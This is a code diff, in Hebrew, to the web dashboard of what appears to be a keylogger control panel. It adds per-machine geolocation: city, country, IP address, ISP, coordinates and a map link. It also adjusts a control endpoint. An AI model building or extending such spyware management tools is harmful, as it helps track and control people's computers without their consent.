@@ -176,9 +176,14 @@ function renderMachinesGrid(machines, filter = "all", searchTerm = "") {
     // מידע המחשב
     const info = machine.info || {};
     const system = info.system || {};
+    const geo = info.geo || {};
     const osInfo = system.os_name
       ? `${system.os_name} ${system.os_version || ""}`
       : "לא ידוע";
+
+    // מידע גיאוגרפי
+    const locationInfo =
+      geo.status === "success" ? `${geo.city || ""}, ${geo.country || ""}` : "";
 
     // יצירת אלמנט הכרטיס עם אנימציית כניסה
     const machineCol = document.createElement("div");
@@ -207,6 +212,14 @@ function renderMachinesGrid(machines, filter = "all", searchTerm = "") {
                             <p class="card-text mt-2">
                                 <small class="text-muted">${osInfo}</small>
                             </p>
+                            ${
+                              locationInfo
+                                ? `<p class="card-text location-info">
+                                <i class="fas fa-map-marker-alt text-danger me-1"></i>
+                                <small>${locationInfo}</small>
+                            </p>`
+                                : ""
+                            }
                             <div class="d-flex justify-content-between mt-2">
                                 <small class="text-muted">נראה לאחרונה: ${lastSeenStr}</small>
                             </div>
@@ -313,6 +326,7 @@ function fillMachineDetails(machine) {
   const memory = info.memory || {};
   const cpu = info.cpu || {};
   const disks = info.disks || [];
+  const geo = info.geo || {};
 
   // מידע כללי
   document.getElementById("detail-pc-name").textContent =
@@ -368,6 +382,13 @@ function fillMachineDetails(machine) {
     fillNetworkAdaptersInfo(network.network_adapters || []);
   } else {
     console.error("Network adapters container not found in DOM");
+  }
+
+  // מידע גיאוגרפי
+  if (document.getElementById("geo-info-container")) {
+    fillGeoInfo(geo);
+  } else {
+    console.error("Geo info container not found in DOM");
   }
 }
 
@@ -631,6 +652,119 @@ function fillDisksTable(disks) {
   });
 }
 
+// מילוי מידע גיאוגרפי
+function fillGeoInfo(geo) {
+  const container = document.getElementById("geo-info-container");
+
+  // בדיקה שהאלמנט קיים
+  if (!container) {
+    console.error("geo-info-container element not found");
+    return;
+  }
+
+  if (!geo || geo.status !== "success") {
+    container.innerHTML = `
+            <div class="text-center py-3">
+              <i class="fas fa-info-circle text-muted me-2"></i>
+              אין מידע גיאוגרפי זמין
+            </div>
+          `;
+    return;
+  }
+
+  // יצירת כרטיסיות מידע
+  container.innerHTML = `
+    <div class="row">
+      <div class="col-md-6">
+        <div class="card h-100 mb-3 mb-md-0">
+          <div class="card-body p-3">
+            <h6 class="card-title mb-3">
+              <i class="fas fa-map-marker-alt text-danger me-2"></i>מיקום
+            </h6>
+            <div class="list-group list-group-flush">
+              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
+                <span>מדינה</span>
+                <span class="fw-medium">${geo.country || "לא ידוע"} (${
+    geo.countryCode || ""
+  })</span>
+              </div>
+              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
+                <span>עיר</span>
+                <span class="fw-medium">${geo.city || "לא ידוע"}</span>
+              </div>
+              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
+                <span>אזור</span>
+                <span class="fw-medium">${geo.regionName || "לא ידוע"}</span>
+              </div>
+              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
+                <span>מיקוד</span>
+                <span class="fw-medium">${geo.zip || "לא ידוע"}</span>
+              </div>
+              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
+                <span>אזור זמן</span>
+                <span class="fw-medium">${geo.timezone || "לא ידוע"}</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="col-md-6">
+        <div class="card h-100">
+          <div class="card-body p-3">
+            <h6 class="card-title mb-3">
+              <i class="fas fa-network-wired text-primary me-2"></i>פרטי רשת
+            </h6>
+            <div class="list-group list-group-flush">
+              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
+                <span>כתובת IP</span>
+                <span class="fw-medium">${geo.query || "לא ידוע"}</span>
+              </div>
+              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
+                <span>ספק אינטרנט</span>
+                <span class="fw-medium">${geo.isp || "לא ידוע"}</span>
+              </div>
+              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
+                <span>ארגון</span>
+                <span class="fw-medium">${geo.org || "לא ידוע"}</span>
+              </div>
+              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
+                <span>AS</span>
+                <span class="fw-medium">${geo.as || "לא ידוע"}</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="mt-3">
+      <div class="card">
+        <div class="card-body p-3">
+          <h6 class="card-title mb-3">
+            <i class="fas fa-map text-success me-2"></i>קואורדינטות
+          </h6>
+          <div class="d-flex justify-content-between">
+            <div>
+              <div class="text-muted small">קו רוחב</div>
+              <div class="fw-bold">${geo.lat || "לא ידוע"}</div>
+            </div>
+            <div>
+              <div class="text-muted small">קו אורך</div>
+              <div class="fw-bold">${geo.lon || "לא ידוע"}</div>
+            </div>
+            <div>
+              <a href="https://www.google.com/maps?q=${geo.lat},${
+    geo.lon
+  }" target="_blank" class="btn btn-sm btn-outline-primary">
+                <i class="fas fa-external-link-alt me-1"></i>פתח במפות
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  `;
+}
+
 // מילוי מידע על כרטיסי רשת
 function fillNetworkAdaptersInfo(adapters) {
   const container = document.getElementById("network-adapters-container");
@@ -772,7 +906,7 @@ async function sendControl(machineId, action) {
 async function getControlStatus(machineId) {
   try {
     const response = await KeyLoggerAPI.fetchWithAuth(
-      `/api/ctrl?machine_id=${machineId}&from_api=1`
+      `/ctrl?machine_id=${machineId}&from_api=1`
     );
 
     if (response && response.ok) {
